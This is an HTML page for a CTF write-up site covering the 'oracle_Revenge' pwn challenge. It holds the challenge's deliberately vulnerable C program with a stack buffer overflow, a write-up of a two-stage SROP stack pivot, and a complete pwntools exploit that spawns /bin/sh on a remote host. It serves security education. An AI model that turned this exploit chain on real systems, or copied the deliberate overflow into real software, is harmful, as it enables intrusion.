@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>oracle_Revenge // Rogue_Net</title>
+    <meta name="description" content="# Two Echoes - Revenge The silence has deepened, and the echoes have turned hostile. The orchestra is gone, leaving only the raw signal in the void.">
+    <link rel="stylesheet" href="../../../../static/css/style.css">
+</head>
+<body>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>oracle_Revenge<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>MOJO-JOJO CTF</span>
+                <span>0xe230d4f4</span>
+                
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                # Two Echoes - Revenge The silence has deepened, and the echoes have turned hostile. The orchestra is gone, leaving only the raw signal in the void.
+            </div>
+        </div>
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// main.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">/*
+ * Two Echoes - Part 2
+ * 
+ * Hardened: No /bin/sh string.
+ * Vulnerability: Buffer Overflow.
+ * Helper: Leaks address of a writable scratch buffer to facilitate Stack Pivoting.
+ */
+
+void syscall_exit(int code) {
+    __asm__ volatile (
+        &#34;mov $60, %%rax\n&#34;
+        &#34;syscall&#34;
+        : : &#34;D&#34;(code)
+    );
+}
+
+long syscall_write(int fd, const void *buf, unsigned long count) {
+    long ret;
+    __asm__ volatile (
+        &#34;mov $1, %%rax\n&#34;
+        &#34;syscall&#34;
+        : &#34;=a&#34;(ret) : &#34;D&#34;(fd), &#34;S&#34;(buf), &#34;d&#34;(count) : &#34;rcx&#34;, &#34;r11&#34;, &#34;memory&#34;
+    );
+    return ret;
+}
+
+long syscall_read(int fd, void *buf, unsigned long count) {
+    long ret;
+    __asm__ volatile (
+        &#34;mov $0, %%rax\n&#34;
+        &#34;syscall&#34;
+        : &#34;=a&#34;(ret) : &#34;D&#34;(fd), &#34;S&#34;(buf), &#34;d&#34;(count) : &#34;rcx&#34;, &#34;r11&#34;, &#34;memory&#34;
+    );
+    return ret;
+}
+
+void print(const char *s) {
+    int len = 0;
+    while(s[len]) len++;
+    syscall_write(1, s, len);
+}
+
+void print_hex(unsigned long addr) {
+    char hex[19] = &#34;0x&#34;;
+    for(int i = 15; i &gt;= 0; i--) {
+        int nibble = (addr &gt;&gt; (i * 4)) &amp; 0xF;
+        hex[17 - i] = nibble &lt; 10 ? &#39;0&#39; + nibble : &#39;a&#39; + nibble - 10;
+    }
+    hex[18] = &#39;\n&#39;;
+    syscall_write(1, hex, 19);
+}
+
+// ════════════════════════════════════════
+// GADGETS
+// ════════════════════════════════════════
+// Naked functions to ensure compiler doesn&#39;t add prologue/epilogue
+__attribute__((naked)) void gadget_pop_rax() {
+    __asm__ volatile (&#34;pop %rax; ret;&#34;);
+}
+
+__attribute__((naked)) void gadget_syscall() {
+    __asm__ volatile (&#34;syscall; ret;&#34;);
+}
+
+// ════════════════════════════════════════
+// SCRATCH BUFFER
+// ════════════════════════════════════════
+// A large writable area for stack pivoting
+char scratch_buffer[0x1000] __attribute__((section(&#34;.data&#34;)));
+
+void listen() {
+    char buffer[32]; // Small buffer for overflow
+    
+    print(&#34;The void echoes louder...\n&#34;);
+    print(&#34;Use this echo to guide your signal: &#34;);
+    print_hex((unsigned long)scratch_buffer);
+    
+    print(&#34;Speak signal:\n&#34;);
+    // Overflow vulnerability
+    syscall_read(0, buffer, 0x400); 
+}
+
+int main() {
+    print(&#34;════════════════════════════════\n&#34;);
+    print(&#34;     ECHOES Revenge\n&#34;);
+    print(&#34;════════════════════════════════\n&#34;);
+    print(&#34;Only signals remain.\n&#34;);
+    print(&#34;════════════════════════════════\n&#34;);
+    
+    listen();
+    
+    print(&#34;\nThe silence returns.\n&#34;);
+    syscall_exit(0);
+    return 0;
+}
+</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>Oracle Revenge (Echoes Revenge) — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Insane</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>r3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Two-Stage SROP + Stack Pivot</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
+<p>Same protections as Oracle, but the key difference: <strong>no <code>/bin/sh</code> string</strong> exists in the binary. We need to write it ourselves.</p>
+<p>The binary <strong>leaks the address of a writable scratch buffer</strong> (<code>scratch_buffer[0x1000]</code> in <code>.data</code>):</p>
+<div class="codehilite"><pre><span></span><code><span class="n">The</span><span class="w"> </span><span class="nb nb-Type">void</span><span class="w"> </span><span class="n">echoes</span><span class="w"> </span><span class="n">louder</span><span class="o">...</span>
+<span class="n">Use</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">guide</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="k">signal</span><span class="p">:</span><span class="w"> </span><span class="mh">0x00000000004040c0</span>
+</code></pre></div>
+
+<h2>Exploit Strategy: Two SROP Stages</h2>
+<h3>Stage 1: Pivot to writable memory</h3>
+<p>First SROP frame performs <code>sys_read</code> to read our second payload into the scratch buffer, <strong>pivoting RSP</strong> to <code>scratch_buffer + 0x100</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">frame1</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">frame1</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">0</span>              <span class="c1"># sys_read</span>
+<span class="n">frame1</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span>              <span class="c1"># stdin</span>
+<span class="n">frame1</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">scratch_addr</span>   <span class="c1"># write to scratch buffer</span>
+<span class="n">frame1</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x500</span>
+<span class="n">frame1</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
+<span class="n">frame1</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">pivot_addr</span>     <span class="c1"># RSP = scratch + 0x100</span>
+</code></pre></div>
+
+<h3>Stage 2: Write "/bin/sh" + execve</h3>
+<p>Second payload writes <code>"/bin/sh\x00"</code> at <code>scratch_addr</code>, then pads to <code>pivot_addr</code> where another SROP frame calls <code>execve</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">p2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">p2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">p2</span><span class="p">))</span>  <span class="c1"># pad to pivot point</span>
+<span class="c1"># ... SROP frame for execve</span>
+<span class="n">frame2</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">scratch_addr</span>   <span class="c1"># points to &quot;/bin/sh&quot;</span>
+</code></pre></div>
+
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code>[+] Scratch Buffer Leaked @ 0x4040c0
+[+] Shell verified!
+$ cat flag.txt
+MOJO-JOJO{st4ck_p1v0t_s1gr0p_m4st3r}
+</code></pre></div>
+            </div>
+        </div>
+        
+
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#!/usr/bin/env python3
+
+
+from pwn import *
+
+context.log_level = &#39;info&#39;
+context.arch = &#39;amd64&#39;
+binary = &#39;./main&#39;
+elf = ELF(binary)
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:
+        return remote(args.HOST or &#39;4.233.210.175&#39;, args.PORT or 9004, *a, **kw)
+    else:
+        return process([binary] + argv, *a, **kw)
+
+gdbscript = &#39;&#39;&#39;
+b *listen+45
+continue
+&#39;&#39;&#39;
+
+# Gadget addresses (will be found dynamically in script)
+pop_rax = 0
+syscall_ret = 0
+
+def solve():
+    global pop_rax, syscall_ret
+    
+    # 1. Find Gadgets
+    # Since we built it with symbols, we can look them up, 
+    # but for robustness let&#39;s verify.
+    try:
+        pop_rax = elf.symbols[&#39;gadget_pop_rax&#39;]
+        syscall_ret = elf.symbols[&#39;gadget_syscall&#39;]
+    except:
+        # Fallback manual scan if symbols missing
+        rop = ROP(elf)
+        pop_rax = rop.find_gadget([&#39;pop rax&#39;, &#39;ret&#39;])[0]
+        # syscall; ret is rare in ROPgadget default search sometimes
+        # let&#39;s assume challenge provides it if symbols fail
+        pass
+        
+    log.info(f&#34;pop rax; ret @ {hex(pop_rax)}&#34;)
+    log.info(f&#34;syscall; ret @ {hex(syscall_ret)}&#34;)
+
+    io = start()
+    
+    # 2. Get Scratch Buffer Leak
+    io.recvuntil(b&#39;guide your signal: &#39;)
+    scratch_addr = int(io.recvline().strip(), 16)
+    log.success(f&#34;Scratch Buffer Leaked @ {hex(scratch_addr)}&#34;)
+    
+    io.recvuntil(b&#39;Speak signal:\n&#39;)
+    
+    # DEBUG: Find offset with cyclic pattern
+    &#39;&#39;&#39;
+    io.send(cyclic(200))
+    io.wait()
+    core = io.corefile
+    offset = cyclic_find(core.fault_addr)
+    log.info(f&#34;Offset found: {offset}&#34;)
+    return
+    &#39;&#39;&#39;
+    # Start with common dynamic linking offset assumption (usually 40 or 72)
+    offset = 40 
+    
+    
+    
+    pivot_addr = scratch_addr + 0x100
+    
+    # Payload 1
+    p1 = b&#39;A&#39; * offset
+    p1 += p64(pop_rax)
+    p1 += p64(15)           # RAX = 15 (sys_tr_sigreturn)
+    p1 += p64(syscall_ret)  # syscall
+    
+    frame1 = SigreturnFrame()
+    frame1.rax = 0              # sys_read
+    frame1.rdi = 0              # fd = 0 (stdin)
+    frame1.rsi = scratch_addr   # buf = scratch
+    frame1.rdx = 0x500          # count
+    frame1.rip = syscall_ret    # execute syscall
+    frame1.rsp = pivot_addr     # NEW STACK POINTER
+    
+    p1 += bytes(frame1)
+    
+    io.send(p1)
+    time.sleep(0.2)
+    
+
+    p2 = b&#39;/bin/sh\x00&#39;              # at scratch_addr
+    
+    # Pad until pivot_addr (0x100 bytes from start)
+    # current length is 8.
+    p2 += b&#39;\x90&#39; * (0x100 - len(p2))
+    
+    # NOW WE ARE AT `pivot_addr` (RSP points here after read returns)
+    # The `ret` of the `syscall; ret` gadget will pop from here!
+    
+    # We need to set RAX=59, RDI=binsh, etc. using SIGROP
+    p2 += p64(pop_rax)
+    p2 += p64(15)
+    p2 += p64(syscall_ret)
+    
+    frame2 = SigreturnFrame()
+    frame2.rax = 59             # sys_execve
+    frame2.rdi = scratch_addr   # points to &#34;/bin/sh&#34;
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall_ret
+    frame2.rsp = pivot_addr + 0x400 # Just somewhere writable/safe
+    
+    p2 += bytes(frame2)
+    
+    io.send(p2)
+    time.sleep(0.5)
+    
+    # Check shell
+    io.sendline(b&#39;echo SHELL_ACTIVE&#39;)
+    try:
+        if b&#39;SHELL_ACTIVE&#39; in io.recv(timeout=1):
+            log.success(&#34;Shell verified!&#34;)
+        else:
+            log.warning(&#34;Exploit sent but no echo...&#34;)
+    except:
+        log.warning(&#34;Exploit sent but no response.&#34;)
+        
+    io.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    solve()
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../../static/js/main.js"></script>
+</body>
+</html>
